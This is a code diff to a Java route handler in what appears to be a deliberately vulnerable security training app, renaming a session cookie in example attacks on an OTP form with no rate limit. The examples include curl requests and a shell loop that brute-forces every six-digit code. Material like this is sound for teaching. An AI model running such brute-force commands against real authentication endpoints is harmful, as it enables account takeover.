@@ -102,13 +102,13 @@ public class InsecureDesignHandler implements IRouteHandler {
         String exploits = TemplateEngine.exploitBox(new String[][]{
             {"Brute-force correct OTP", "123456",
              "This is the hardcoded correct value. In the vulnerable panel you can guess it after any number of wrong attempts.", "otp",
-             "curl -s -X POST http://localhost:8090/insecure-design/vulnerable -b 'JSESSIONID=SESSION' -d 'otp=123456'"},
+             "curl -s -X POST http://localhost:8090/insecure-design/vulnerable -b 'SESSION_COOKIE=SESSION' -d 'otp=123456'"},
             {"Sequential guessing", "000000",
              "Script 000000 through 999999 — only 1 million combinations. No rate limit means this completes in seconds.", "otp",
-             "for i in $(seq -w 0 999999); do curl -s -X POST http://localhost:8090/insecure-design/vulnerable -b 'JSESSIONID=SESSION' -d \"otp=$i\" | grep -q 'accepted' && echo \"Found: $i\" && break; done"},
+             "for i in $(seq -w 0 999999); do curl -s -X POST http://localhost:8090/insecure-design/vulnerable -b 'SESSION_COOKIE=SESSION' -d \"otp=$i\" | grep -q 'accepted' && echo \"Found: $i\" && break; done"},
             {"Common OTP", "111111",
              "Users often set PINs like 111111 or 123456. Try predictable codes first before brute-forcing.", "otp",
-             "curl -s -X POST http://localhost:8090/insecure-design/vulnerable -b 'JSESSIONID=SESSION' -d 'otp=111111'"},
+             "curl -s -X POST http://localhost:8090/insecure-design/vulnerable -b 'SESSION_COOKIE=SESSION' -d 'otp=111111'"},
         });
 
         String content = TemplateEngine.vulnerabilityBadge(Messages.get("insecure-design.badge.id"), Messages.get("insecure-design.badge.name"), Messages.get("insecure-design.badge.tag")) + info + exploits + panels;
